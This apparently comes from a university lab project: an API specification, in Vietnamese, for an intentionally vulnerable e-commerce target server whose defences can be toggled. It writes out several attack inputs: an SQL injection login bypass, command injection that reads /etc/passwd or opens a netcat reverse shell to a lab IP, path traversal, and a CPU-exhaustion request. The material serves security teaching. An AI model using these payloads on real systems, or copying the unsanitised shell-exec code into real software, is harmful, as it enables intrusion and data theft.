# Đặc Tả API Máy Chủ Mục Tiêu (Target Server API Specification)

> **Node:** `target-server` (Container/VM Target, Cổng `8000`)  
> **Người phụ trách:** Hoàng Trung (TV3) — *Target App & Kịch bản Tấn công / Phòng thủ L7*  
> **Tài liệu tham chiếu:** [docs/plan.pdf](../../plan.pdf) (Task W1-T3, W2-T3, W3-T3, W4-T3, W5-T3, W6-T3)  
> **Tài liệu OpenAPI tự động:** [openapi.json](./openapi.json)  
> **Interactive Swagger UI:** `http://localhost:8000/api/docs`  
> **Prefix toàn cục:** `/api`

---

## 1. Tổng quan kiến trúc API

Target Server được xây dựng trên framework **NestJS** và CSDL **SQLite WAL**, phục vụ 2 mục đích đồng thời:
1. **Nghiệp vụ Website Thương mại Điện tử ElectroShop:** Quản lý danh mục linh kiện phần cứng, bo mạch vi điều khiển (MCU), cảm biến, giỏ hàng người dùng và tài liệu kỹ thuật (datasheets).
2. **Kịch bản Thử nghiệm An toàn Thông tin (PBL4 Lab Testbed):** Cung cấp các điểm neo (endpoints) có chủ đích để mô phỏng các lỗ hổng tầng ứng dụng (L7) và tầng hệ điều hành (OS Command Injection), đồng thời kiểm chứng cơ chế tự vệ của Khiên L3.

---

## 2. Danh mục các nhóm API

```mermaid
graph LR
    subgraph Target Server [Target Server - Port 8000]
        Auth["/api/auth (Login & SQLi)"]
        Products["/api/products (Linh kiện ElectroShop)"]
        Cart["/api/cart (Giỏ hàng & Checkout)"]
        Docs["/api/documents (Datasheet & Blueprint Flag)"]
        Defense["/api/defense (Khiên L3 Toggle & Set)"]
        Reports["/api/reports (Heavy CPU DoS)"]
        Files["/api/files (Path Traversal)"]
        System["/api/system (Ping, Health & Command Injection)"]
    end

    Swagger["Swagger UI (/api/docs)"] --> Target Server
    Client["ElectroShop Frontend (/client)"] --> Target Server
    ClientBot["Client Bot Traffic Generator"] --> Target Server
    Attacker["Attacker CLI / Scapy / S1-S6"] --> Target Server
    Target Server -. TelemetryInterceptor .-> GodView["God-View Hub (Port 4000)"]
```

---

## 3. Chi tiết các Endpoints

### 3.1. Xác thực & Kịch bản SQL Injection (`/api/auth`)

#### `POST /api/auth/login`
- **Mô tả:** Đăng nhập hệ thống, kiểm tra quyền truy cập và cấp token JWT (thời hạn 30 ngày).
- **Cơ chế mô phỏng an toàn thông tin:**
  - **Khi Khiên L3 TẮT (`anti_sqli: false`):** Sử dụng câu lệnh Raw SQL nối chuỗi trực tiếp. Kẻ tấn công có thể bypass bằng payload:
    ```json
    { "username": "admin' --", "password": "any_password" }
    ```
    Hệ thống phản hồi HTTP 200 OK kèm thông tin user `admin` và cảnh báo an ninh:
    `"⚠️ [CẢNH BÁO AN NINH] Đăng nhập thành công qua lỗ hổng SQL Injection (Khiên L3 đang tắt)!"`
  - **Khi Khiên L3 BẬT (`anti_sqli: true`):** Tự động chuyển sang sử dụng **Prepared Statement** có tham số hóa. Cùng payload trên sẽ bị chặn đứng với mã lỗi **HTTP 401 Unauthorized**.
- **Request Body mẫu:**
  ```json
  {
    "username": "admin",
    "password": "adminPassword2026!"
  }
  ```
- **Response mẫu (200 OK):**
  ```json
  {
    "status": "success",
    "message": "Đăng nhập thành công",
    "user": {
      "id": 1,
      "username": "admin",
      "role": "admin",
      "fullName": "System Administrator",
      "email": "admin@electroshop.vn"
    },
    "defense_mode": "SECURED_PREPARED_QUERY",
    "sqli_bypassed": false,
    "token_type": "Bearer",
    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "expires_in": "30d"
  }
  ```

---

### 3.2. Điều khiển Khiên Phòng Thủ L3 (`/api/defense`)

#### `GET /api/defense/status`
- **Mô tả:** Lấy trạng thái hiện thời của Master Shield và 3 khiên con.
- **Response:**
  ```json
  {
    "status": "success",
    "flags": {
      "l3_master": true,
      "anti_sqli": true,
      "rate_limit": true,
      "input_sanitization": true
    },
    "timestamp": "2026-11-21T13:30:00.000Z"
  }
  ```

#### `POST /api/defense/toggle`
- **Mô tả:** Đảo trạng thái Khiên L3. Được liên kết trực tiếp với nút **"Lab Control"** trên giao diện ElectroShop và nút **"Remote Defense Toggle"** trên God-View.
- **Request Body:** `{}` (đảo toàn bộ Master L3) hoặc `{ "flag": "anti_sqli" }` (đảo cờ con).
- **Hợp đồng phản hồi chuẩn (God-View đọc trường `current_state.l3_master`):**
  ```json
  {
    "status": "success",
    "message": "Đã đảo trạng thái Khiên L3 (Master) thành BẬT (SECURED)",
    "current_state": {
      "l3_master": true,
      "anti_sqli": true,
      "rate_limit": true,
      "input_sanitization": true
    }
  }
  ```

#### `POST /api/defense/set`
- **Mô tả:** Gán trạng thái chỉ định cho từng cờ phòng thủ.
- **Request Body:** `{"l3_master": true, "anti_sqli": true, "rate_limit": false}`.

---

### 3.3. Giám sát Hệ thống & Lỗ Hổng OS Command Injection (`/api/system`)

#### `GET /api/system/health`
- **Mô tả:** Trả về trạng thái `online`, thời gian hoạt động (`uptime_seconds`), dung lượng bộ nhớ RAM đang dùng và trạng thái khiên phòng thủ.

#### `GET /api/system/ping?t=1730000000000`
- **Mô tả:** Client gửi timestamp hiện tại qua tham số `t`. Server tính toán độ trễ phản hồi mạng `latency_ms` phục vụ vẽ biểu đồ Radar trên màn hình God-View.

#### `GET /api/system/network-ping?host=127.0.0.1` (Kịch bản Command Injection W4-T3)
- **Mô tả:** Endpoint kiểm tra kết nối mạng (Ping Utility) chứa lỗ hổng Command Injection có chủ đích:
- **Cơ chế an toàn thông tin:**
  - **Khi Khiên L3 TẮT (`input_sanitization = false`):** Thực thi lệnh trực tiếp qua Shell:
    `child_process.exec("ping -c 1 " + host)`
    Hacker có thể truyền payload nối lệnh:
    `?host=127.0.0.1; cat /etc/passwd` hoặc `?host=127.0.0.1; nc -e /bin/sh 172.20.0.66 4444` (Reverse Shell).
    Hệ thống trả về kết quả thực thi lệnh hệ điều hành kèm cảnh báo bảo mật.
  - **Khi Khiên L3 BẬT (`input_sanitization = true`):** Bộ lọc phát hiện các ký tự `;`, `|`, `&`, `$`, backticks và chặn đứng bằng mã **HTTP 400 Bad Request** (`shield: "L3_COMMAND_INJECTION_BLOCKED"`).

---

### 3.4. Nghiệp vụ Sản phẩm & Danh mục ElectroShop (`/api/products`)

#### `GET /api/products/categories`
- **Mô tả:** Lấy danh sách danh mục và số lượng linh kiện tương ứng để render Filter Pills: `Tất cả (6)`, `Vi điều khiển (2)`, `Cảm biến (2)`, `Module nguồn (2)`.

#### `GET /api/products`
- **Tham số Query:** `category`, `search`, `sort` (`price_asc`, `price_desc`).
- **Format linh kiện:** Cung cấp thông tin linh kiện phần cứng, giá bán, specs badge (ví dụ: `["Cortex-M4", "5V Logic", "WiFi / BLE"]`).

#### `GET /api/products/sku/:sku`
- **Mô tả:** Tra cứu chi tiết linh kiện theo mã SKU phần cứng (ví dụ: `MCU-ARD-R4`, `MCU-ESP-32D`, `SEN-UC-SR04`...).

---

### 3.5. Nghiệp vụ Giỏ hàng & Đặt hàng (`/api/cart`)

#### `GET /api/cart`
- **Mô tả:** Lấy thông tin giỏ hàng và tổng số lượng món. Mặc định nạp session khách `demo-guest-session-pbl4` (chứa sẵn 2 món linh kiện, khớp badge `[2]` trên Navbar).

#### `POST /api/cart`
- **Mô tả:** Thêm sản phẩm vào giỏ khi click nút **"Thêm giỏ"**. Body: `{ "productId": 2, "quantity": 1 }`.

#### `POST /api/cart/checkout`
- **Mô tả:** Thực hiện đặt hàng và lưu vết giao dịch vào bảng `orders`.

---

### 3.6. Tài liệu Kỹ thuật & Rò rỉ Dữ liệu (`/api/documents`)

#### `GET /api/documents`
- **Mô tả:** Lấy danh sách Datasheet PDF kỹ thuật. Mặc định ẩn tài liệu mật (`is_confidential = 0`).

#### `GET /api/documents/:id/download`
- **Mô tả:** Tải file tài liệu về máy.
- **Hành vi bảo mật PBL4:**
  - Đối với tài liệu tuyệt mật (`rd-confidential-hardware-blueprint.pdf`, ID = 5):
    - **Khi Khiên L3 BẬT:** Chặn đứng với mã **HTTP 403 Forbidden** (`shield: "L3_CONFIDENTIAL_POLICY_ACTIVE"`).
    - **Khi Khiên L3 TẮT:** Cho phép tải file về máy, kèm Header `X-Security-Warning: Confidential-Document-Exfiltrated-Shield-Off` và Flag:
      `FLAG{PBL4_PATH_TRAVERSAL_AND_CONFIDENTIAL_DOC_LEAKED}`.

---

### 3.7. Kịch bản Tấn công L7 DoS & Path Traversal

#### `GET /api/reports/analytics?iterations=100000`
- **Mô tả:** Bắt máy chủ tính toán chuỗi băm SHA-256 liên tục để mô phỏng kiệt quệ CPU. Khi Khiên L3 bật, nếu một IP gửi liên tục quá 10 request trong 5 giây, `DynamicRateLimitGuard` sẽ chặn đứng với mã lỗi **HTTP 429 Too Many Requests**.

#### `GET /api/files/download?name=../../etc/passwd`
- **Mô tả:** Mô phỏng tấn công leo thang thư mục (Path Traversal). Khi Khiên L3 bật, `InputSanitization` phát hiện chuỗi `..`, `/` hoặc `\` và chặn đứng với mã lỗi **HTTP 400 Bad Request**.

---

## 4. Đặc Tả Script Giả Lập Người Dùng (Client Bot Traffic Generator - W3-T3)

Để phục vụ kịch bản làm "con mồi" cho Attacker bắt gói tin MitM Sniffing và tiêm gói RST ngắt phiên:
* **File thực thi:** `target-app/agents/client_bot.py` (hoặc `client-bot.js`).
* **Hành vi:** Chạy vòng lặp định kỳ mỗi 3–5 giây:
  1. Gửi `GET /api/products` (duyệt sản phẩm).
  2. Gửi `POST /api/auth/login` với tài khoản thường `engineer_user / pass123`.
  3. Gửi `GET /api/system/ping` để duy trì kết nối TCP liên tục (làm mục tiêu cho đòn TCP RST Injection).
